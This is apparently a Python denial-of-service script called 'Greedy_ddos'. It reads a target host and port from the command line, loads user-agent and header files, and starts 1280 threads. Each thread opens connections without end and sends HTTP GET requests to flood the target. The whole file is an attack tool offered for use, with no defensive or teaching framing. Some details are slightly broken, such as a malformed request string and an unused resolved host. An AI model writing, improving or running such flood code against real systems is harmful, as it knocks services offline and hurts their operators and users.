import hek
import time
import random, threading
import argparse

class Greedy_ddos:
    def __init__(self):
        self.packet_count = 0
        self.agent = Greedy_ddos.load_agents(self)
        self.headers = Greedy_ddos.load_headers(self)


    def load_headers(self):
        print("[+] LOADING HEADERS")
        file = open("headers.txt")
        headers = file.read()
        file.close()
        print("[+] LOADED HEADERS")
        return headers

    def load_agents(self):
        print("[+] LOADING USER-AGENTS")
        agents = open("agent.txt")
        agent_list = []
        for agent in agents.read().splitlines():
            agent_list.append(agent)
        print("[+] LOADED USER-AGENTS")
        return agent_list

    def ip_check(self, ip):

        if hek.ipstuff.checkip(ip) == False:

            return hek.ipstuff.siteip(url=ip)
        else:
            return ip

    def port_check(self, host, port):
        if hek.server.portscan(ip=host, port=port) == True:
            return
        else:
            raise ConnectionRefusedError("failed to connect ip-port")
    def ddos(self, host, port):
        serve = hek.server.socket()
        while True:
            try:
                sock = serve.socket()
                serve.connect(sock, host=str(host), port=int(port))
                packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(self.agent)+"\n"+self.headers).encode('utf-8')
                result = serve.sendpacket(sock, packet, host=host, port=int(port), connected=True, auto_close=True, encoding="utf-8")
                if result == True:
                    self.packet_count = self.packet_count + 1
                    print(f"[{self.packet_count}]  <<<<==  packet sent ==>>>>")
            except:
                print("LOOKING DEAD !!")

if __name__ == "__main__":
    greedy = Greedy_ddos()

    parser = argparse.ArgumentParser()

    parser.add_argument("--ddos", action="store_true")
    parser.add_argument("-ip", "--host", type=str)
    parser.add_argument("-port", "--port", type=int)

    args = parser.parse_args()
    threads = 1280
    print("[+] PROCESSING GREEDY DDOS")
    print(f"[+] THREADS COUNT ({threads}")
    print("[+] CHECKING HOST..")
    if args.ddos:
        print(f"[+] IP ADDRESS {args.host}")
        print(f"[+] PORT {args.port}")
        print("[+] CHECKING HOST..")
        host = greedy.ip_check(args.host)
        print("[+] CHECKING IP-PORT")
        greedy.port_check(args.host, args.port)
        for _ in range(int(threads)):
            threading.Thread(target=greedy.ddos, args=[args.host, args.port]).start()
    else:
        print("maybe you miss something follow the example in github.")


